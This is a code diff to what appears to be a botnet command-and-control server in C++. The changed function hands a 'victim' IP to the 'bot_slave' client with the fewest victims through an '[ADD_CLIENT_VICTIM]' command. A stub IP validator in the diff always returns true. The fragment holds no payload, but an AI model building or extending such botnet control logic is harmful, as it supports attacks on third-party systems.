@@ -186,20 +186,21 @@ void server::handleAddVictim(std::string& command, std::vector<std::string>& par
 	int min_victims = INT_MAX;
 
 	for (const auto& cl : clients_data_container_) {
-		//std::cout << cl.second.id << "\n";
 		if (cl.second.victims < min_victims && cl.second.status == "bot_slave") {
 			min_victims = cl.second.victims;
 			client_id_for_min_victims = cl.second.id;
 		}
 	}
-	std::cout << "FINAL ID: " << client_id_for_min_victims << "\n";
-	std::cout << "LALAs " << clients_sessions_container_.find(client_id_for_min_victims)->second->ip_ << "\n";
 
-	std::vector<std::string> output_params = {"YOURREVCEIVE"};
-	std::string comm = "[RU_HERE]";
-	auto client_id_for_min_victims_session = clients_sessions_container_.find(client_id_for_min_victims)->second;
+	if (client_id_for_min_victims) {
+		std::vector<std::string> output_params = {victim_ip};
+		std::string comm = "[ADD_CLIENT_VICTIM]";
+		auto client_id_for_min_victims_session = clients_sessions_container_.find(client_id_for_min_victims)->second;
+		client_id_for_min_victims_session->send(msg_parser_.genCommand(comm, output_params));
+		victims_ips_.push_back(victim_ip);
+	}
 
-	client_id_for_min_victims_session->send("Watch me whip\n");
+
 
 	// TODO:@mark add new victim to structure + check if given ip is valid address
 }
@@ -269,3 +270,7 @@ void server::updateMsgCounter_(session* client) {
 }
 
 bool server::isNumber_(const std::string& s) { return !s.empty() && std::all_of(s.begin(), s.end(), ::isdigit); }
+
+bool server::validate_ip(std::string ip_string) {
+	return true;
+}
